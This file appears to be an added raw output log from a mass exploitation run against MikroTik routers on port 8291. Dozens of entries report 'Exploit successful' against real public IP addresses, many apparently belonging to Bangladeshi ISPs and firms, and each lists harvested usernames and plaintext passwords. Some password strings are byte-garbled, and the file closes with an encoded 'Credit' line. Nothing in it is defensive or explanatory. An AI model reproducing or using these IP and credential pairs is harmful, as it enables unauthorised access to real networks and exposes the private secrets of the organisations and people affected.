@@ -1,0 +1,1704 @@
+----
+Connected to 103.4.119.231:8291
+Exploit successful
+User: rabbi
+Pass: rabb1
+
+User: rabbi
+Pass: rabb1
+
+User: shuhel
+Pass: Shuhel@143
+
+User: admin
+Pass: xxxx
+
+User: dircreate
+Pass: sH5TjHgBSU
+
+User: admin
+Pass: 32!
+
+User: transcom
+Pass: Trans@32!
+------
+Connected to 116.68.197.154:8291
+Exploit successful
+User: link3
+Pass: link3
+
+User: unique
+Pass: unique
+
+User: admin
+Pass: l3@support
+
+User: system
+Pass: Supp0rt@cs*
+
+User: link3
+Pass: link3
+-----------
+Connected to 103.234.24.233:8291
+Exploit successful
+User: cmt
+Pass: cmt321
+
+User: bts
+Pass: S3LF1SH1NG
+
+User: admin
+Pass: S3LF1SH1NG
+
+User: cmt
+Pass: S3LF1SH1NG
+
+User: dircreate
+Pass: ZqTyic6Mjr
+
+User: dircreate
+Pass: ZqTyic6Mjr
+
+User: admin
+Pass: S3LF1SH1NG
+-----------
+Connected to 103.4.118.93:8291
+Exploit successful
+User: elson
+Pass: son@321
+
+User: elson
+Pass: son@321
+
+User: admin
+Pass: elson987
+-------
+Connected to 103.78.162.70:8291
+Exploit successful
+User: taskeen
+Pass: Moonsky007
+
+User: taskeen
+Pass: Moonsky@07
+
+User: admin
+Pass: Moonsky@07
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+-------
+Connected to 115.127.68.67:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: access
+Pass: bracnet!@#
+
+User: bracnet
+Pass: br@cnet&*^
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: @pl@123
+
+User: bn
+Pass: bn123
+
+User: bracnet
+Pass: br@cnet&*^
+---------
+Connected to 115.127.68.68:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: access
+Pass: bracnet!@#
+
+User: bracnet
+Pass: br@cnet&*^
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: @pl@123
+
+User: bn
+Pass: bn123
+
+User: bracnet
+Pass: br@cnet&*^
+----------
+Connected to 115.127.68.69:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: access
+Pass: bracnet!@#
+
+User: bracnet
+Pass: br@cnet&*^
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: @pl@123
+
+User: bn
+Pass: bn123
+
+User: bracnet
+Pass: br@cnet&*^
+---------
+Connected to 115.127.68.70:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: access
+Pass: bracnet!@#
+
+User: bracnet
+Pass: br@cnet&*^
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: apl@1234
+
+User: apl
+Pass: @pl@123
+
+User: bn
+Pass: bn123
+
+User: bracnet
+Pass: br@cnet&*^
+---------
+Connected to 202.51.191.201:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: oasis#@321
+-------------
+Connected to 103.148.11.106:8291
+Exploit successful
+User: admin1
+Pass: Monomita75
+
+User: admin1
+Pass: Monomita75
+
+User: admin
+Pass: 1111
+-----------------
+Connected to 27.147.145.138:8291
+Exploit successful
+User: link3
+Pass: link321
+
+User: npbs2
+Pass: npbs22020
+
+User: link3
+Pass: link321
+
+User: admin
+Pass: L3@rsupport
+--------
+Connected to 119.18.147.187:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: samsung02
+--------
+Connected to 116.206.253.118:8291
+Exploit successful
+User: bp
+Pass: bp12345
+
+User: admin
+Pass: 
+
+User: onesky
+Pass: onesky@1sky
+
+User: bp
+Pass: bp12345
+---------
+Connected to 103.138.25.62:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: admin999
+------------
+Connected to 103.151.169.247:8291
+Exploit successful
+User: rotan
+Pass: rotan
+
+User: admin
+Pass: 
+
+User: tomato
+Pass: tomato@support
+
+User: 123
+Pass: 1234
+
+User: \xffrotan]�
+Pass: 0ÏÆµ}qOCJs"
+
+User: 123
+Pass: 1234
+----------
+Connected to 121.200.63.142:8291
+Exploit successful
+User: biplob
+Pass: biplobbkb1
+
+User: biplob
+Pass: biplobbkb1
+
+User: jptr
+Pass: jptr@2015
+
+User: jptr
+Pass: jptr@2017
+
+User: \xff\xffdriki
+Pass: 15êãX|7K5iÎ
+
+User: dircreate
+Pass: GugD3myWh6
+
+User: dircreate
+Pass: GugD3myWh6
+
+User: drikict
+Pass: Dr1k5u99
+-------------
+Connected to 122.152.55.245:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: administrator
+Pass: 
+
+User: admin
+Pass: 
+
+User: administrator
+Pass: oNePh@rma
+
+User: opl@na\xff\xff
+Pass: Ò#%¿pù1ùXéå¸Í
+
+User: admin
+Pass: bank123
+
+User: dircreate
+Pass: Cb61JqVAmb
+
+User: dircreate
+Pass: Cb61JqVAmb
+---------------
+Connected to 103.106.242.146:8291
+Exploit successful
+User: asad
+Pass: p@ssw0rd
+
+User: asad
+Pass: p@ssw0rd
+
+User: admin
+Pass: p@ssw0rd
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: mirittika
+Pass: p@ssw0rd
+----------------
+Connected to 103.250.70.198:8291
+Exploit successful
+User: next
+Pass: o9614nol
+
+User: admin
+Pass: 
+
+User: next
+Pass: O9614nol
+
+User: nextonline
+Pass: NextOnline@321
+
+User: nextonline
+Pass: NextOnline@321
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+------------------
+Connected to 103.91.229.19:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: IcznmJNxUnTfy2c
+----------------
+Connected to 123.200.5.210:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: Nawab
+Pass: Nam2020!@#$1
+
+User: aamra
+Pass: power0fwe
+
+User: system
+Pass: L3@rsupport
+
+User: hassan
+Pass: Asdf0123
+
+User: admin
+Pass: nawabL321
+
+User: admin
+Pass: Don1234!@#$
+------------------
+Connected to 103.20.53.101:8291
+Exploit successful
+User: test1
+Pass: test123
+
+User: test
+Pass: 123
+
+User: test1
+Pass: 5rcg01noc
+
+User: Debasish
+Pass: mS#2020b
+
+User: system
+Pass: Supp0rt@cs*
+
+User: test
+Pass: 123
+
+User: Administrator
+Pass: +D@t8462#ÌÍÅ1ò*Þ
+---------------------
+Connected to 103.4.116.233:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: brri@#321
+---------
+Connected to 123.200.14.210:8291
+Exploit successful
+User: faysal
+Pass: faysal@link3
+
+User: faysal
+Pass: faysal@786
+
+User: admin
+Pass: xxxx
+
+User: system
+Pass: MS@paSSword
+
+User: admin
+Pass: link3@cs*
+
+User: system
+Pass: MS@paSSword
+--------
+Connected to 163.47.147.209:8291
+Exploit successful
+User: dircreate
+Pass: 7pDEeif4GC
+
+User: mine
+Pass: 123
+
+User: noc
+Pass: Nocc@321
+
+User: ADN
+Pass: Sunway123##
+
+User: admin
+Pass: dhaka123##
+-----------
+Connected to 103.161.152.222:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: admin999
+
+User: admin
+Pass: admin999
+------------
+Connected to 103.36.102.106:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: mnbl
+Pass: mn#mn
+
+User: support
+Pass: support
+
+User: mnbl
+Pass: mn#mn
+----------
+Connected to 103.86.200.48:8291
+Exploit successful
+User: abcde
+Pass: 4321
+
+User: race
+Pass: race7866
+
+User: admin
+Pass: 123@
+
+User: otobi
+Pass: otobi@2021#
+
+User: abcde
+Pass: 4321
+
+User: dircreate
+Pass: KWitbzMwky
+
+User: dircreate
+Pass: KWitbzMwky
+
+User: admin
+Pass: 123@
+------------
+Connected to 123.200.2.57:8291
+Exploit successful
+User: binate
+Pass: macbookpro2k18
+
+User: binate
+Pass: macbookpro2k18
+
+User: link3
+Pass: l|nk3cl!ent
+
+User: support
+Pass: customer@#
+
+User: link\xff
+Pass: Óq7npPäuÇ¸\]#X
+
+User: support
+Pass: customer@#
+
+User: system
+Pass: default
+
+User: system
+Pass: default
+------------
+Connected to 182.48.70.25:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: lion
+Pass: lion123
+
+User: support
+Pass:  
+
+User: badhan
+Pass: global@1
+
+User: r31337
+Pass: r31337
+-------------
+Connected to 203.76.115.90:8291
+Exploit successful
+User: risk
+Pass: G&g@Ri$k
+
+User: risk
+Pass: G&g@Ri$k
+
+User: admin
+Pass: link3@123#
+-----------------
+Connected to 27.147.144.209:8291
+Exploit successful
+User: l3admin
+Pass: d@t@l399
+
+User: support
+Pass: customer@#
+
+User: l3admin
+Pass: d@t@l399
+
+User: arabi
+Pass: arabi
+
+User: link3cs
+Pass: 1234
+
+User: admin
+Pass: afl@#@786786
+-----------
+Connected to 27.147.144.210:8291
+Exploit successful
+User: l3admin
+Pass: d@t@l399
+
+User: support
+Pass: customer@#
+
+User: l3admin
+Pass: d@t@l399
+
+User: arabi
+Pass: arabi
+
+User: link3cs
+Pass: 1234
+
+User: admin
+Pass: afl@#@786786
+-------------
+Connected to 59.152.63.40:8291
+Exploit successful
+User: mnbl
+Pass: Mn6@Mkt18
+
+User: metronet
+Pass: 1nt@m3tr0n3t#
+
+User: int
+Pass: 1nt@mnbl#
+
+User: support
+Pass: support
+
+User: int
+Pass: 1nt@mnbl#
+--------------
+Connected to 27.147.144.161:8291
+Exploit successful
+User: test
+Pass: test123
+
+User: test
+Pass: test123
+
+User: link3
+Pass: customer@#
+
+User: support
+Pass: customer@#
+
+User: support
+Pass: customer@#tpç>°	
+
+User: ab_rahman
+Pass: 3287621
+
+User: jahangir121
+Pass: Jahangir3021
+
+User: admin1
+Pass: admin123
+-------------
+Connected to 103.213.237.129:8291
+Exploit successful
+User: system
+Pass: HighScreen
+
+User: rony-rcl
+Pass: babe123@
+
+User: Murad
+Pass: dvrrcL21
+
+User: admin
+Pass: Mpur@2017
+
+User: r333
+Pass: admin31337
+
+User: r31337
+Pass: r31337
+-------
+Connected to 103.245.205.210:8291
+Exploit successful
+User: hamid
+Pass: hamid@321
+
+User: hamid
+Pass: hamid@321
+
+User: nextonline
+Pass: NextOnline@321
+
+User: nextonline
+Pass: NextOnline@321
+
+User: MikroTikSystem
+Pass: 2a5Z8D~ÐÈgïâxVììGBBO
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+---------
+Connected to 182.160.103.185:8291
+Exploit successful
+User: Test
+Pass: test
+
+User: well
+Pass: Well@R
+
+User: btl
+Pass: btl@btl
+
+User: aamra
+Pass: Power0f$2015$ANL
+
+User: admin
+Pass: Well@R
+
+User: shahed
+Pass: shahed
+-----------
+Connected to 182.160.121.185:8291
+Exploit successful
+User: Test
+Pass: test
+
+User: well
+Pass: Well@R
+
+User: btl
+Pass: btl@btl
+
+User: aamra
+Pass: Power0f$2015$ANL
+
+User: admin
+Pass: Well@R
+
+User: shahed
+Pass: shahed
+---------------
+Connected to 103.153.28.74:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: salim
+Pass: 22871053018
+
+User: admin
+Pass: dnl7676202
+
+User: billing
+Pass: billing
+
+User: SAZAG
+Pass: molla222
+------------
+Connected to 182.160.116.190:8291
+Exploit successful
+User: X
+Pass: 643905DFDA35
+
+User: akhter
+Pass: mahin123
+
+User: transcom
+Pass: HighScreen
+
+User: transcom
+Pass: HighScreen
+
+User: X
+Pass: 643905DFDA35
+
+User: dircreate
+Pass: fpK1jGAdYg
+
+User: admin
+Pass: HighScreen
+
+User: akhter
+Pass: mahin123
+---------
+Connected to 103.234.26.65:8291
+Exploit successful
+User: mirnet
+Pass: BT$c0m
+
+User: sujon
+Pass: sujon
+
+User: bts
+Pass: pr0t0c0l
+
+User: mpbs2
+Pass: mpbs2
+
+User: mirnet
+Pass: BT$c0m
+---------
+Connected to 119.148.31.198:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: AgNicOrE248
+------------
+Connected to 103.139.197.100:8291
+Exploit successful
+User: akash
+Pass: akash870669
+
+User: admin
+Pass: akash870669
+
+User: akash
+Pass: akash870669
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+------------------------
+Connected to 115.127.68.186:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: city
+Pass: City@12345
+-----------------------
+Connected to 27.147.135.137:8291
+Exploit successful
+User: samrat
+Pass: samrat
+
+User: system
+Pass: MS@paSSword
+
+User: support
+Pass: link3@cs*
+
+User: support
+Pass: link3@cs*
+
+User: l3admin
+Pass: d@t@l399
+
+User: samrat
+Pass: samrat
+-------------------
+Connected to 27.147.216.35:8291
+Exploit successful
+User: sho
+Pass: sH@@nT@6431
+
+User: alap
+Pass: Alap123
+
+User: l3admin
+Pass: d@t@l3110
+
+User: admin
+Pass: Admin123
+
+User: rahim
+Pass: Babu8018246$
+
+User: shanta
+Pass: shanta@l3
+
+User: ssl
+Pass: $h@NT@$
+
+User: sho
+Pass: sH@@nT@6431
+-----------------------
+Connected to 103.70.171.174:8291
+Exploit successful
+User: global
+Pass: global@@@555
+
+User: PN
+Pass: plusnet
+
+User: PN
+Pass: plusnet
+
+User: admin
+Pass: admin2
+
+User: global
+Pass: global@@@555
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+-------------------------
+Connected to 123.200.11.217:8291
+Exploit successful
+User: system
+Pass: Sysdhn@#123
+
+User: hasan
+Pass: Hasan@GCL
+
+User: gcl
+Pass: gcl@password
+
+User: noc
+Pass: cpl@123456
+
+User: \xff\xffadm
+Pass: :Æ ö¹ï¡
+
+User: concord
+Pass: concord@217
+
+User: link3
+Pass: l|nk3cl!ent
+
+User: system
+Pass: Sysdhn@#123
+
+User: link3
+Pass: link3
+-------------------------
+Connected to 103.137.160.130:8291
+Exploit successful
+User: st
+Pass: St@2022@
+
+User: \xffrazib���\xff\xf0���
+Pass: Ó¶Ãº%C#xù¬Å
+
+User: razib
+Pass: prisilarazib
+
+User: padma
+Pass: padma
+
+User: st
+Pass: St@2022@
+---------------------
+Connected to 103.137.80.22:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: HighScreen
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+---------------------
+Connected to 103.148.51.95:8291
+Exploit successful
+User: 123
+Pass: 123
+
+User: admin
+Pass: 
+
+User: swc
+Pass: swc2021
+
+User: admin
+Pass: swc2021
+---------------------
+Connected to 103.230.63.26:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: support
+Pass: O9614121
+
+User: next
+Pass: O9614nol
+
+User: admin
+Pass: policy123
+
+User: r31337
+Pass: r31337
+-----------------------------
+Connected to 103.23.206.170:8291
+Exploit successful
+User: system
+Pass: HighScreen
+
+User: RNP-DET
+Pass: 1a2b3c
+
+User: admin
+Pass: HighScreen
+
+User: system
+Pass: HighScreen
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+---------------------
+Connected to 115.127.109.210:8291
+Exploit successful
+User: IT
+Pass: IT@321
+
+User: bracnet
+Pass: br@cnet&*^
+
+User: access
+Pass: bracnet!@#
+
+User: access
+Pass: bracnet!@#
+
+User: shadow
+Pass: shadow
+
+User: IT
+Pass: IT@321
+--------------
+Connected to 163.47.34.58:8291
+Exploit successful
+User: aftab
+Pass: @ftab123
+
+User: Jony
+Pass: 123456
+
+User: Jony
+Pass: 
+
+User: ict
+Pass: ict@cccul
+
+User: ict
+Pass:  
+
+User: aftab
+Pass: @ftab123
+-------------------
+Connected to 202.40.184.105:8291
+Exploit successful
+User: admIn
+Pass: Spe1zAnaTow7b
+
+User: supp0rt
+Pass: R@nks#Tel
+
+User: admin_nctb
+Pass: $nctb@1963$
+
+User: ranksitt@121
+Pass: ranksitt@121
+
+User: admin_nctb
+Pass: 1@ame»=õ]æõ+Þ(
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+-------------------
+Connected to 27.147.139.11:8291
+Exploit successful
+User: l3admin
+Pass: d@t@l399
+
+User: l3admin
+Pass: d@t@l399
+
+User: arabi
+Pass: arabi
+
+User: admin
+Pass: xxxx
+
+User: cs
+Pass: ¿åõE·ÜD@`>ðá½
+
+User: afl
+Pass: afl
+
+User: arabi
+Pass: arabi
+
+User: admin
+Pass: afl@#@786786
+
+User: arabi
+Pass: arabi
+-----------------
+Connected to 27.147.139.9:8291
+Exploit successful
+User: l3admin
+Pass: d@t@l399
+
+User: l3admin
+Pass: d@t@l399
+
+User: arabi
+Pass: arabi
+
+User: admin
+Pass: xxxx
+
+User: cs
+Pass: ¿åõE·ÜD@`>ðá½
+
+User: afl
+Pass: afl
+
+User: arabi
+Pass: arabi
+
+User: admin
+Pass: afl@#@786786
+
+User: arabi
+Pass: arabi
+----------------
+Connected to 27.147.144.171:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: phisit@351528
+---------------------
+Connected to 27.147.146.145:8291
+Exploit successful
+User: adminx
+Pass: j456dt(_)
+
+User: admin
+Pass: 
+
+User: cs
+Pass: cs
+
+User: l3admin
+Pass: d@t@l399
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmmàjBBO
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+-------------
+Connected to 45.114.89.134:8291
+Exploit successful
+User: raju
+Pass: link3
+
+User: link3
+Pass: F0n0c
+
+User: raju
+Pass: link3
+
+User: sujan
+Pass: tnh@sujan
+
+User: user
+Pass: 123321
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: rahul
+Pass: ó<cö{©£=ñRKpÉOÔöÅo3zµ¨ÍØÐoMÔ×Èâ­íñµ
+
+User: raktim
+Pass: Raktim949
+----------------
+Connected to 45.125.223.108:8291
+Exploit successful
+User: user1
+Pass: 212132
+
+User: admin
+Pass: Salarput123
+
+User: IOL
+Pass: welcome@iol
+
+User: IOL
+Pass: welcome@iol
+
+User: IOLNOC
+Pass: welcome@iol
+
+User: carnival
+Pass: admin@carnival
+
+User: carnival
+Pass: admin@carnival
+-----------
+Connected to 45.64.134.194:8291
+Exploit successful
+User: aamra
+Pass: Power0f$2015$ANL
+
+User: admin
+Pass: 
+
+User: aamra
+Pass: Power0f$2015$ANL
+
+Connected to 103.140.205.173:8291
+Exploit successful
+User: gspeed
+Pass: gspeed@123
+
+User: lognoc
+Pass: jemontemon
+
+User: admin
+Pass: 
+
+User: lognoc
+Pass: jemontemon
+-----------
+Connected to 103.140.205.197:8291
+Exploit successful
+User: gspeed
+Pass: gspeed@123
+
+User: lognoc
+Pass: jemontemon
+
+User: admin
+Pass: 
+
+User: lognoc
+Pass: jemontemon
+----------------
+Connected to 103.165.161.101:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: manikmoyna24434
+
+User: manik
+Pass: manikkawsin
+
+User: manik
+Pass: manikkawsin
+--------------
+Connected to 103.165.161.105:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: manikmoyna24434
+
+User: manik
+Pass: manikkawsin
+
+User: manik
+Pass: manikkawsin
+----------------
+Connected to 45.126.75.91:8291
+Exploit successful
+User: Monwar
+Pass: Az@#011011
+
+User: admin
+Pass: 
+
+User: Apurbo
+Pass: Az@#011011
+
+User: Monwar
+Pass: Az@#011011
+
+User: MikroTikSystem
+Pass: 2a5Z8D~ÐÈgïâxVììGBBO
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+-----------
+Connected to 175.29.190.78:8291
+Exploit successful
+User: zaman
+Pass: zaman@123
+
+User: core
+Pass: core@facrouter
+
+User: zaman
+Pass: zaman@123
+
+User: prgnoc
+Pass: noc@prgfac
+
+User: showrov
+Pass: Acc1234$$
+
+User: wasim
+Pass: mwssujon
+
+User: sohel
+Pass: admin@sohel
+
+User: nocteam
+Pass: noc@prgfac
+-------------
+Connected to 27.147.153.18:8291
+Exploit successful
+User: zaman
+Pass: zaman@123
+
+User: core
+Pass: core@facrouter
+
+User: zaman
+Pass: zaman@123
+
+User: prgnoc
+Pass: noc@prgfac
+
+User: showrov
+Pass: Acc1234$$
+
+User: wasim
+Pass: mwssujon
+
+User: sohel
+Pass: admin@sohel
+
+User: nocteam
+Pass: noc@prgfac
+---------------
+Connected to 180.92.238.251:8291
+Exploit successful
+User: ishak
+Pass: ishak
+
+User: System
+Pass: System497118
+
+User: admin
+Pass: password
+
+User: IT
+Pass: bangla
+
+User: Shamim
+Pass: snO¿Û¹>ÈeíéIóÇ
+
+User: ishak
+Pass: ishak
+
+User: Shamim
+Pass: shamim
+------------
+Connected to 202.136.89.228:8291
+Exploit successful
+User: Sohel
+Pass: 123456
+
+User: circle
+Pass: 2664
+
+User: Sohel
+Pass: 123456
+------------------
+Connected to 45.120.38.44:8291
+Exploit successful
+User: r31337
+Pass: r31337
+
+User: paradise
+Pass: paradise123
+
+User: support
+Pass: Ex@byte12345
+
+User: noc
+Pass: noc@support
+
+User: tiger
+Pass: cica890#
+
+User: r31337
+Pass: r31337
+
+User: infolink
+Pass: infolink@1234
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+-----------------
+Connected to 103.101.199.137:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: admin999
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+------------------
+Connected to 103.219.161.201:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: Brodynt@#321
+----------------
+Connected to 115.127.79.234:8291
+Exploit successful
+User: bracnet
+Pass: br@cnet&*^
+
+User: bracnet
+Pass: br@cnet&*^
+
+User: noc
+Pass: not4all
+
+User: noc
+Pass: not4all
+-------------------
+Connected to 119.148.30.197:8291
+Exploit successful
+User: agni
+Pass: agni@123
+
+User: itadmin
+Pass: Nimda@@510@@705
+
+User: admin
+Pass: link3@cs*
+
+User: agni
+Pass: Agni@321
+
+User: system
+Pass: MS@paSSword
+
+User: system
+Pass: MS@paSSword
+
+User: dircreate
+Pass: 63taL6aotu
+
+User: dircreate
+Pass: 63taL6aotu
+-------------------
+Connected to 119.148.30.198:8291
+Exploit successful
+User: agni
+Pass: agni@123
+
+User: itadmin
+Pass: Nimda@@510@@705
+
+User: admin
+Pass: link3@cs*
+
+User: agni
+Pass: Agni@321
+
+User: system
+Pass: MS@paSSword
+
+User: system
+Pass: MS@paSSword
+
+User: dircreate
+Pass: 63taL6aotu
+
+User: dircreate
+Pass: 63taL6aotu
+-----------------
+Connected to 123.200.16.174:8291
+Exploit successful
+User: agni
+Pass: agni@123
+
+User: itadmin
+Pass: Nimda@@510@@705
+
+User: admin
+Pass: link3@cs*
+
+User: agni
+Pass: Agni@321
+
+User: system
+Pass: MS@paSSword
+
+User: system
+Pass: MS@paSSword
+
+User: dircreate
+Pass: 63taL6aotu
+
+User: dircreate
+Pass: 63taL6aotu
+----------------------------
+Connected to 14.1.102.14:8291
+Exploit successful
+User: spider
+Pass: spider369
+
+User: spider
+Pass: spider369
+
+User: afzal
+Pass: afzalk355
+
+User: fusion
+Pass: fusion!@#
+
+User: admin
+Pass: ·¯ðÌä5(&¸ÑòJc]×¤,ßI{Lm¸IîD
+
+User: afzal
+Pass: afzalk355
+--------------------
+Connected to 180.211.179.22:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: it_admin@sec
+Pass: iT@Sec_2021
+
+User: it_admin@sec
+Pass: iT@Sec_2021
+
+User: it_admin@sec
+Pass: iT@Sec_2021
+--------------------
+Connected to 203.202.247.221:8291
+Exploit successful
+User: akhter
+Pass: mahin123
+
+User: akhter
+Pass: mahin123
+
+User: admin
+Pass: 5rcg01noc
+
+User: system_default
+Pass: CC:2D:E0:87:73:B4
+
+User: \xffadmin
+Pass: +ã0«mÞrº]ÏO0ò
+----------------------------
+Connected to 27.147.215.36:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: pakiza#32
+
+User: pakiza
+Pass: pakiza155
+-------------------
+Connected to 103.161.86.45:8291
+Exploit successful
+User: polas
+Pass: 76527
+
+User: polas
+Pass: Fm2018wifi
+
+User: admin
+Pass: fm2018wifi
+
+User: MikroTikSystem
+Pass: 2a5Z8DOgsrugkLkmm7V
+
+User: fm
+Pass: Fm2018wifi
+-----------------------
+Connected to 210.1.241.56:8291
+Exploit successful
+User: mrdink
+Pass: mrdink
+
+User: akash
+Pass: sys@dmin
+
+User: admin
+Pass: RadiantadmiN
+
+User: akash
+Pass: sys@dmin
+
+User: admin
+Pass: RadiantadmiN
+
+User: akash
+Pass: sys@dmin
+
+User: admin
+Pass: RadiantadmiN
+------------------------------
+Connected to 103.179.154.20:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: badhan
+Pass: global@1
+
+User: moshiur
+Pass: moshiur@789
+
+User: motin
+Pass: motin@123
+
+User: badd\xffh
+Pass: céDµYÕÁÕì]àü
+
+User: moshiur
+Pass: moshiur@789
+----------------
+Connected to 27.147.131.185:8291
+Exploit successful
+User: fis
+Pass: fis4321
+
+User: l3admin
+Pass: d@t@l3110
+
+User: user
+Pass: user#123
+
+User: fis
+Pass: fis4321
+---------------
+Credit : rb3duMDBfQkQ=
